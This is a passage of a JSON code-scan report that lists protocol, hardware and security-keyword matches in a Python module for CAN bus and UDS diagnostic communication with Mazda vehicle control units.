217, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTED"}, {"type": "protocol", "line": 225, "protocol": "CAN", "content": "self.filters: List[CANFilter] = self.config.filters.copy()"}, {"type": "protocol", "line": 228, "protocol": "CAN", "content": "self.stats = CANStatistics()"}, {"type": "protocol", "line": 245, "protocol": "CAN", "content": "self.error_callbacks: List[Callable[[CANError], None]] = []"}, {"type": "protocol", "line": 248, "protocol": "CAN", "content": "self.logger.info(f\"MazdaCANEngine initialized with {self.config.interface_type}\")"}, {"type": "protocol", "line": 252, "protocol": "CAN", "content": "Connect to CAN interface."}, {"type": "protocol", "line": 257, "protocol": "CAN", "content": "if self.state != CANState.DISCONNECTED:"}, {"type": "protocol", "line": 258, "protocol": "CAN", "content": "raise CANError(f\"Cannot connect, current state: {self.state.value}\")"}, {"type": "protocol", "line": 261, "protocol": "CAN", "content": "self.state = CANState.CONNECTING"}, {"type": "protocol", "line": 273, "protocol": "CAN", "content": "raise CANInterfaceError(f\"Unsupported interface type: {self.config.interface_type}\")"}, {"type": "protocol", "line": 276, "protocol": "CAN", "content": "self.state = CANState.CONNECTED"}, {"type": "protocol", "line": 292, "protocol": "CAN", "content": "self.logger.info(f\"CAN interface connected: {self.config.channel}\")"}, {"type": "protocol", "line": 295, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 299, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 300, "protocol": "CAN", "content": "self.logger.error(f\"CAN connection failed: {e}\")"}, {"type": "protocol", "line": 301, "protocol": "CAN", "content": "raise CANInterfaceError(f\"Connection failed: {e}\")"}, {"type": "protocol", "line": 304, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN interface.\"\"\""}, {"type": "protocol", "line": 305, "protocol": "CAN", "content": "if self.state == CANState.DISCONNECTED:"}, {"type": "protocol", "line": 333, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTED"}, {"type": "protocol", "line": 334, "protocol": "CAN", "content": "self.logger.info(\"CAN interface disconnected\")"}, {"type": "protocol", "line": 337, "protocol": "CAN", "content": "\"\"\"Connect to SocketCAN interface.\"\"\""}, {"type": "protocol", "line": 378, "protocol": "CAN", "content": "self.logger.error(f\"SocketCAN connection failed: {e}\")"}, {"type": "protocol", "line": 382, "protocol": "CAN", "content": "\"\"\"Connect to PCAN interface.\"\"\""}, {"type": "protocol", "line": 396, "protocol": "CAN", "content": "self.logger.error(f\"PCAN connection failed: {e}\")"}, {"type": "protocol", "line": 418, "protocol": "CAN", "content": "\"\"\"Connect to SLCAN interface.\"\"\""}, {"type": "protocol", "line": 432, "protocol": "CAN", "content": "self.logger.error(f\"SLCAN connection failed: {e}\")"}, {"type": "protocol", "line": 443, "protocol": "CAN", "content": "can_msg = CANMessage("}, {"type": "protocol", "line": 528, "protocol": "CAN", "content": "def _get_priority_from_id(self, arbitration_id: int) -> CANPriority:"}, {"type": "protocol", "line": 529, "protocol": "CAN", "content": "\"\"\"Determine message priority from CAN ID.\"\"\""}, {"type": "protocol", "line": 531, "protocol": "0x[0-9A-Fa-f]+", "content": "if arbitration_id < 0x100:"}, {"type": "protocol", "line": 532, "protocol": "CAN", "content": "return CANPriority.HIGHEST"}, {"type": "protocol", "line": 533, "protocol": "0x[0-9A-Fa-f]+", "content": "elif arbitration_id < 0x200:"}, {"type": "protocol", "line": 534, "protocol": "CAN", "content": "return CANPriority.HIGH"}, {"type": "protocol", "line": 535, "protocol": "0x[0-9A-Fa-f]+", "content": "elif arbitration_id < 0x700:"}, {"type": "protocol", "line": 536, "protocol": "CAN", "content": "return CANPriority.NORMAL"}, {"type": "protocol", "line": 538, "protocol": "CAN", "content": "return CANPriority.LOW"}, {"type": "protocol", "line": 540, "protocol": "CAN", "content": "def _should_accept_message(self, message: CANMessage) -> bool:"}, {"type": "protocol", "line": 551, "protocol": "CAN", "content": "async def send_message(self, message: CANMessage,"}, {"type": "protocol", "line": 554, "protocol": "CAN", "content": "Send CAN message."}, {"type": "protocol", "line": 557, "protocol": "CAN", "content": "message: CAN message to send"}, {"type": "protocol", "line": 563, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 564, "protocol": "CAN", "content": "raise CANError(\"Not connected to CAN interface\")"}, {"type": "protocol", "line": 568, "protocol": "CAN", "content": "raise CANError(f\"Insufficient permissions for CAN ID {message.arbitration_id:03X}\")"}, {"type": "protocol", "line": 585, "protocol": "CAN", "content": "raise CANInterfaceError(\"Interface does not support sending\")"}, {"type": "protocol", "line": 599, "protocol": "CAN", "content": "self.logger.error(f\"Failed to send CAN message: {e}\")"}, {"type": "protocol", "line": 604, "protocol": "CAN", "content": "message: CANMessage) -> bool:"}, {"type": "protocol", "line": 605, "protocol": "CAN", "content": "\"\"\"Check if user has permission to send to this CAN ID.\"\"\""}, {"type": "protocol", "line": 608, "protocol": "0x[0-9A-Fa-f]+", "content": "0x7E0: SecurityLevel.DIAGNOSTIC,  # ECM requests"}, {"type": "protocol", "line": 609, "protocol": "0x[0-9A-Fa-f]+", "content": "0x7E1: SecurityLevel.DIAGNOSTIC,  # TCM requests"}, {"type": "protocol", "line": 610, "protocol": "0x[0-9A-Fa-f]+", "content": "0x7E2: SecurityLevel.DIAGNOSTIC,  # ABS requests"}, {"type": "protocol", "line": 611, "protocol": "0x[0-9A-Fa-f]+", "content": "0x7DF: SecurityLevel.DIAGNOSTIC,  # Broadcast requests"}, {"type": "protocol", "line": 621, "protocol": "CAN", "content": "def add_filter(self, filt: CANFilter) -> None:"}, {"type": "protocol", "line": 652, "protocol": "CAN", "content": "def add_handler(self, arbitration_id: int, handler: Callable[[CANMessage], None]) -> None:"}, {"type": "protocol", "line": 653, "protocol": "CAN", "content": "\"\"\"Add message handler for specific CAN ID.\"\"\""}, {"type": "protocol", "line": 656, "protocol": "CAN", "content": "def remove_handler(self, arbitration_id: int, handler: Callable[[CANMessage], None]) -> None:"}, {"type": "protocol", "line": 666, "protocol": "CAN", "content": "def add_error_callback(self, callback: Callable[[CANError], None]) -> None:"}, {"type": "protocol", "line": 670, "protocol": "CAN", "content": "def _notify_error(self, error: CANError) -> None:"}, {"type": "protocol", "line": 679, "protocol": "CAN", "content": "async def request_message(self, arbitration_id: int, timeout: float = 2.0) -> Optional[CANMessage]:"}, {"type": "protocol", "line": 684, "protocol": "CAN", "content": "arbitration_id: CAN ID to request"}, {"type": "protocol", "line": 690, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 691, "protocol": "CAN", "content": "raise CANError(\"Not connected to CAN interface\")"}, {"type": "protocol", "line": 694, "protocol": "CAN", "content": "request = CANMessage("}, {"type": "protocol", "line": 696, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x00]),  # Simple request"}, {"type": "protocol", "line": 697, "protocol": "CAN", "content": "priority=CANPriority.NORMAL"}, {"type": "protocol", "line": 717, "protocol": "CAN", "content": "arbitration_id: Optional[int] = None) -> List[CANMessage]:"}, {"type": "protocol", "line": 723, "protocol": "CAN", "content": "arbitration_id: Filter by specific CAN ID"}, {"type": "protocol", "line": 735, "protocol": "CAN", "content": "def get_statistics(self) -> CANStatistics:"}, {"type": "protocol", "line": 736, "protocol": "CAN", "content": "\"\"\"Get current CAN statistics.\"\"\""}, {"type": "protocol", "line": 745, "protocol": "CAN", "content": "self.stats = CANStatistics()"}, {"type": "protocol", "line": 750, "protocol": "CAN", "content": "\"\"\"Get Mazda-specific name for CAN ID.\"\"\""}, {"type": "protocol", "line": 751, "protocol": "CAN", "content": "for name, can_id in self.MAZDA_CAN_IDS.items():"}, {"type": "protocol", "line": 757, "protocol": "CAN", "content": "\"\"\"Check if CAN ID is Mazda-specific.\"\"\""}, {"type": "protocol", "line": 758, "protocol": "CAN", "content": "return arbitration_id in self.MAZDA_CAN_IDS.values()"}, {"type": "protocol", "line": 778, "protocol": "CAN", "content": "if request_id_key not in self.MAZDA_CAN_IDS:"}, {"type": "protocol", "line": 781, "protocol": "CAN", "content": "request_id = self.MAZDA_CAN_IDS[request_id_key]"}, {"type": "protocol", "line": 788, "protocol": "CAN", "content": "message = CANMessage("}, {"type": "protocol", "line": 791, "protocol": "CAN", "content": "priority=CANPriority.HIGH"}, {"type": "protocol", "line": 807, "protocol": "CAN", "content": "response_id = self.MAZDA_CAN_IDS.get(f\"{module}_RESPONSE\")"}, {"type": "protocol", "line": 825, "protocol": "UDS", "content": "request: UDSRequest,"}, {"type": "protocol", "line": 830, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 830, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 832, "protocol": "UDS", "content": "Send a UDS diagnostic request and wait for the response."}, {"type": "protocol", "line": 835, "protocol": "UDS", "content": "request: UDS request to send"}, {"type": "protocol", "line": 836, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 842, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 842, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 844, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 845, "protocol": "CAN", "content": "raise CANError(\"Not connected to CAN interface\")"}, {"type": "protocol", "line": 847, "protocol": "UDS", "content": "timeout = timeout or self.UDS_DEFAULT_TIMEOUT"}, {"type": "protocol", "line": 857, "protocol": "CAN", "content": "message = CANMessage("}, {"type": "protocol", "line": 860, "protocol": "CAN", "content": "priority=CANPriority.HIGH"}, {"type": "protocol", "line": 873, "protocol": "UDS", "content": "return UDSResponse("}, {"type": "protocol", "line": 875, "protocol": "UDS", "content": "negative_response_code=UDSNegativeResponseCode.POSITIVE_RESPONSE"}, {"type": "protocol", "line": 887, "protocol": "UDS", "content": "uds_response = UDSResponse.from_bytes(response.data)"}, {"type": "protocol", "line": 890, "protocol": "UDS", "content": "self.logger.error(f\"Failed to parse UDS response: {e}\")"}, {"type": "protocol", "line": 902, "protocol": "UDS", "content": "self.logger.error(f\"All retries exhausted for UDS service 0x{request.service_id:02X}\")"}, {"type": "protocol", "line": 904, "protocol": "CAN", "content": "self._notify_error(CANError(f\"UDS request failed: {last_error}\"))"}, {"type": "protocol", "line": 904, "protocol": "UDS", "content": "self._notify_error(CANError(f\"UDS request failed: {last_error}\"))"}, {"type": "protocol", "line": 911, "protocol": "CAN", "content": "filter_func: Optional[Callable[[CANMessage], bool]] = None"}, {"type": "protocol", "line": 912, "protocol": "CAN", "content": ") -> Optional[CANMessage]:"}, {"type": "protocol", "line": 914, "protocol": "CAN", "content": "Wait for a specific CAN message with optional filtering."}, {"type": "protocol", "line": 917, "protocol": "CAN", "content": "response_id: Expected CAN ID of the response"}, {"type": "protocol", "line": 922, "protocol": "CAN", "content": "CANMessage if received, None on timeout"}, {"type": "protocol", "line": 930, "protocol": "CAN", "content": "filter_func: Optional[Callable[[CANMessage], bool]] = None"}, {"type": "protocol", "line": 931, "protocol": "CAN", "content": ") -> Optional[CANMessage]:"}, {"type": "protocol", "line": 933, "protocol": "CAN", "content": "Wait for a specific CAN message with optional filtering."}, {"type": "protocol", "line": 936, "protocol": "CAN", "content": "response_id: Expected CAN ID of the response"}, {"type": "protocol", "line": 941, "protocol": "CAN", "content": "CANMessage if received, None on timeout"}, {"type": "protocol", "line": 943, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 944, "protocol": "CAN", "content": "raise CANError(\"Not connected to CAN interface\")"}, {"type": "protocol", "line": 969, "protocol": "CAN", "content": "def _is_matching_response(self, msg: CANMessage, request: UDSRequest) -> bool:"}, {"type": "protocol", "line": 969, "protocol": "UDS", "content": "def _is_matching_response(self, msg: CANMessage, request: UDSRequest) -> bool:"}, {"type": "protocol", "line": 970, "protocol": "CAN", "content": "\"\"\"Check if a CAN message is a valid response to a UDS request.\"\"\""}, {"type": "protocol", "line": 970, "protocol": "UDS", "content": "\"\"\"Check if a CAN message is a valid response to a UDS request.\"\"\""}, {"type": "protocol", "line": 976, "protocol": "0x[0-9A-Fa-f]+", "content": "if msg.data[0] == 0x7F and len(msg.data) >= 3:"}, {"type": "protocol", "line": 980, "protocol": "0x[0-9A-Fa-f]+", "content": "if msg.data[0] == (request.service_id | 0x40):"}, {"type": "protocol", "line": 986, "protocol": "0x[0-9A-Fa-f]+", "content": "msg.data[0] == (request.service_id | 0x40) and"}, {"type": "protocol", "line": 994, "protocol": "0x[0-9A-Fa-f]+", "content": "def _pad_to_length(self, data: bytes, length: int, pad_byte: int = 0x55) -> bytes:"}, {"type": "protocol", "line": 1008, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1008, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1010, "protocol": "UDS", "content": "UDS Read Data By Identifier (0x22) service."}, {"type": "protocol", "line": 1010, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Read Data By Identifier (0x22) service."}, {"type": "protocol", "line": 1014, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1019, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1019, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1021, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1022, "protocol": "UDS", "content": "service_id=UDSService.READ_DATA_BY_IDENTIFIER,"}, {"type": "protocol", "line": 1040, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1040, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1042, "protocol": "UDS", "content": "UDS Write Data By Identifier (0x2E) service."}, {"type": "protocol", "line": 1042, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Write Data By Identifier (0x2E) service."}, {"type": "protocol", "line": 1047, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1052, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1052, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1054, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1055, "protocol": "UDS", "content": "service_id=UDSService.WRITE_DATA_BY_IDENTIFIER,"}, {"type": "protocol", "line": 1072, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1072, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1074, "protocol": "UDS", "content": "UDS Diagnostic Session Control (0x10) service."}, {"type": "protocol", "line": 1074, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Diagnostic Session Control (0x10) service."}, {"type": "protocol", "line": 1078, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1083, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1083, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1085, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1086, "protocol": "UDS", "content": "service_id=UDSService.DIAGNOSTIC_SESSION_CONTROL,"}, {"type": "protocol", "line": 1104, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1104, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1106, "protocol": "UDS", "content": "UDS Security Access (0x27) service."}, {"type": "protocol", "line": 1106, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Security Access (0x27) service."}, {"type": "protocol", "line": 1109, "protocol": "0x[0-9A-Fa-f]+", "content": "security_level: Security level (0x01-0x7F for request seed, 0x41-0x7F for send key)"}, {"type": "protocol", "line": 1111, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1116, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1116, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1120, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1121, "protocol": "UDS", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "protocol", "line": 1127, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1128, "protocol": "UDS", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "protocol", "line": 1129, "protocol": "0x[0-9A-Fa-f]+", "content": "subfunction=security_level + 0x40,  # Add 0x40 for key subfunction"}, {"type": "protocol", "line": 1147, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1147, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1149, "protocol": "UDS", "content": "UDS Tester Present (0x3E) service."}, {"type": "protocol", "line": 1149, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Tester Present (0x3E) service."}, {"type": "protocol", "line": 1153, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1158, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1158, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1160, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1161, "protocol": "UDS", "content": "service_id=UDSService.TESTER_PRESENT,"}, {"type": "protocol", "line": 1162, "protocol": "0x[0-9A-Fa-f]+", "content": "subfunction=0x00,"}, {"type": "protocol", "line": 1175, "protocol": "0x[0-9A-Fa-f]+", "content": "group_of_dtc: int = 0xFFFFFF,  # Default: all DTCs"}, {"type": "protocol", "line": 1179, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1179, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1181, "protocol": "UDS", "content": "UDS Clear Diagnostic Information (0x14) service."}, {"type": "protocol", "line": 1181, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Clear Diagnostic Information (0x14) service."}, {"type": "protocol", "line": 1184, "protocol": "0x[0-9A-Fa-f]+", "content": "group_of_dtc: Group of DTCs to clear (0xFFFFFF = all DTCs)"}, {"type": "protocol", "line": 1185, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1190, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1190, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1192, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1193, "protocol": "UDS", "content": "service_id=UDSService.CLEAR_DIAGNOSTIC_INFORMATION,"}, {"type": "protocol", "line": 1211, "protocol": "CAN", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1211, "protocol": "UDS", "content": ") -> Tuple[Optional[UDSResponse], Optional[CANMessage]]:"}, {"type": "protocol", "line": 1213, "protocol": "UDS", "content": "UDS Read DTC Information (0x19) service."}, {"type": "protocol", "line": 1213, "protocol": "0x[0-9A-Fa-f]+", "content": "UDS Read DTC Information (0x19) service."}, {"type": "protocol", "line": 1216, "protocol": "0x[0-9A-Fa-f]+", "content": "report_type: Type of DTC report (0x01-0x0A, 0x42, 0x55, 0x56, 0x61, 0x71, 0x86, 0x87, 0x92)"}, {"type": "protocol", "line": 1218, "protocol": "CAN", "content": "response_id: Expected response CAN ID (None for default)"}, {"type": "protocol", "line": 1223, "protocol": "CAN", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1223, "protocol": "UDS", "content": "Tuple of (UDSResponse, raw CANMessage) or (None, None) on failure"}, {"type": "protocol", "line": 1230, "protocol": "UDS", "content": "request = UDSRequest("}, {"type": "protocol", "line": 1231, "protocol": "UDS", "content": "service_id=UDSService.READ_DTC_INFORMATION,"}, {"type": "protocol", "line": 1245, "protocol": "CAN", "content": "for name in self.MAZDA_CAN_IDS.keys():"}, {"type": "protocol", "line": 1253, "protocol": "CAN", "content": "Monitor CAN bus load for specified duration."}, {"type": "protocol", "line": 1261, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 1293, "protocol": "CAN", "content": "if self.state != CANState.DISCONNECTED:"}, {"type": "protocol", "line": 1294, "protocol": "CAN", "content": "self.logger.warning(\"CANEngine deleted while still connected\")"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "CAN bus", "content": "MazdaCANEngine - CAN bus communication and message handling for Mazda vehicles."}, {"type": "hardware", "line": 2, "hardware": "vehicle", "content": "MazdaCANEngine - CAN bus communication and message handling for Mazda vehicles."}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry, UDSRequest, UDSResponse, UDSService, UDSNegativeRespon"}, {"type": "hardware", "line": 109, "hardware": "CAN bus", "content": "CAN bus communication engine for Mazda vehicles."}, {"type": "hardware", "line": 109, "hardware": "vehicle", "content": "CAN bus communication engine for Mazda vehicles."}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "\"ECM_BROADCAST\": 0x7DF,    # Broadcast to all ECUs"}, {"type": "hardware", "line": 122, "hardware": "TCM", "content": "\"TCM_REQUEST\": 0x7E1,"}, {"type": "hardware", "line": 123, "hardware": "TCM", "content": "\"TCM_RESPONSE\": 0x7E9,"}, {"type": "hardware", "line": 126, "hardware": "ABS", "content": "\"ABS_REQUEST\": 0x7E2,"}, {"type": "hardware", "line": 127, "hardware": "ABS", "content": "\"ABS_RESPONSE\": 0x7EA,"}, {"type": "hardware", "line": 135, "hardware": "BCM", "content": "\"BCM_REQUEST\": 0x7E4,"}, {"type": "hardware", "line": 136, "hardware": "BCM", "content": "\"BCM_RESPONSE\": 0x7EC,"}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "\"VEHICLE_SPEED\": 0x281,"}, {"type": "hardware", "line": 186, "hardware": "SRS", "content": "\"SRS_MODULE\": 0x401,"}, {"type": "hardware", "line": 552, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> bool:"}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "if credentials and not self._check_send_security(credentials, message):"}, {"type": "hardware", "line": 603, "hardware": "ECU", "content": "def _check_send_security(self, credentials: SecurityCredentials,"}, {"type": "hardware", "line": 608, "hardware": "ECU", "content": "0x7E0: SecurityLevel.DIAGNOSTIC,  # ECM requests"}, {"type": "hardware", "line": 609, "hardware": "ECU", "content": "0x7E1: SecurityLevel.DIAGNOSTIC,  # TCM requests"}, {"type": "hardware", "line": 609, "hardware": "TCM", "content": "0x7E1: SecurityLevel.DIAGNOSTIC,  # TCM requests"}, {"type": "hardware", "line": 610, "hardware": "ECU", "content": "0x7E2: SecurityLevel.DIAGNOSTIC,  # ABS requests"}, {"type": "hardware", "line": 610, "hardware": "ABS", "content": "0x7E2: SecurityLevel.DIAGNOSTIC,  # ABS requests"}, {"type": "hardware", "line": 611, "hardware": "ECU", "content": "0x7DF: SecurityLevel.DIAGNOSTIC,  # Broadcast requests"}, {"type": "hardware", "line": 614, "hardware": "ECU", "content": "required_level = restricted_ids.get(message.arbitration_id, SecurityLevel.NONE)"}, {"type": "hardware", "line": 617, "hardware": "ECU", "content": "return required_level == SecurityLevel.NONE"}, {"type": "hardware", "line": 619, "hardware": "ECU", "content": "return credentials.security_level.value >= required_level.value"}, {"type": "hardware", "line": 762, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> bool:"}, {"type": "hardware", "line": 767, "hardware": "TCM", "content": "module: Module name (e.g., \"ECM\", \"TCM\", \"ABS\")"}, {"type": "hardware", "line": 767, "hardware": "ABS", "content": "module: Module name (e.g., \"ECM\", \"TCM\", \"ABS\")"}, {"type": "hardware", "line": 770, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 801, "hardware": "TCM", "content": "module: Module name (e.g., \"ECM\", \"TCM\", \"ABS\")"}, {"type": "hardware", "line": 801, "hardware": "ABS", "content": "module: Module name (e.g., \"ECM\", \"TCM\", \"ABS\")"}, {"type": "hardware", "line": 829, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 839, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1007, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1016, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1039, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1049, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1071, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1080, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1097, "hardware": "ECU", "content": "async def security_access("}, {"type": "hardware", "line": 1099, "hardware": "ECU", "content": "security_level: int,"}, {"type": "hardware", "line": 1103, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1106, "hardware": "ECU", "content": "UDS Security Access (0x27) service."}, {"type": "hardware", "line": 1109, "hardware": "ECU", "content": "security_level: Security level (0x01-0x7F for request seed, 0x41-0x7F for send key)"}, {"type": "hardware", "line": 1110, "hardware": "ECU", "content": "key: Security key (for send key subfunction)"}, {"type": "hardware", "line": 1113, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1121, "hardware": "ECU", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "hardware", "line": 1122, "hardware": "ECU", "content": "subfunction=security_level,"}, {"type": "hardware", "line": 1128, "hardware": "ECU", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "hardware", "line": 1129, "hardware": "ECU", "content": "subfunction=security_level + 0x40,  # Add 0x40 for key subfunction"}, {"type": "hardware", "line": 1146, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1155, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1178, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1187, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1210, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 1220, "hardware": "ECU", "content": "credentials: Security credentials if required"}, {"type": "hardware", "line": 1253, "hardware": "CAN bus", "content": "Monitor CAN bus load for specified duration."}], "security_logic": [{"type": "security_pattern", "line": 775, "pattern": "key", "content": "request_id_key = f\"{module.upper()}_REQUEST\""}, {"type": "security_pattern", "line": 776, "pattern": "key", "content": "response_id_key = f\"{module.upper()}_RESPONSE\""}, {"type": "security_pattern", "line": 778, "pattern": "key", "content": "if request_id_key not in self.MAZDA_CAN_IDS:"}, {"type": "security_pattern", "line": 781, "pattern": "key", "content": "request_id = self.MAZDA_CAN_IDS[request_id_key]"}, {"type": "security_pattern", "line": 1097, "pattern": "security_access", "content": "async def security_access("}, {"type": "security_pattern", "line": 1100, "pattern": "key", "content": "key: Optional[bytes] = None,"}, {"type": "security_pattern", "line": 1109, "pattern": "key", "content": "security_level: Security level (0x01-0x7F for request seed, 0x41-0x7F for send key)"}, {"type": "security_pattern", "line": 1109, "pattern": "seed", "content": "security_level: Security level (0x01-0x7F for request seed, 0x41-0x7F for send key)"}, {"type": "security_pattern", "line": 1110, "pattern": "key", "content": "key: Security key (for send key subfunction)"}, {"type": "security_pattern", "line": 1118, "pattern": "key", "content": "if key is None:"}, {"type": "security_pattern", "line": 1121, "pattern": "security_access", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "security_pattern", "line": 1128, "pattern": "security_access", "content": "service_id=UDSService.SECURITY_ACCESS,"}, {"type": "security_pattern", "line": 1129, "pattern": "key", "content": "subfunction=security_level + 0x40,  # Add 0x40 for key subfunction"}, {"type": "security_pattern", "line": 1130, "pattern": "key", "content": "data=key,"}, {"type": "security_pattern", "line": 1245, "pattern": "key", "content": "for name in self.MAZDA_CAN_IDS.keys():"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
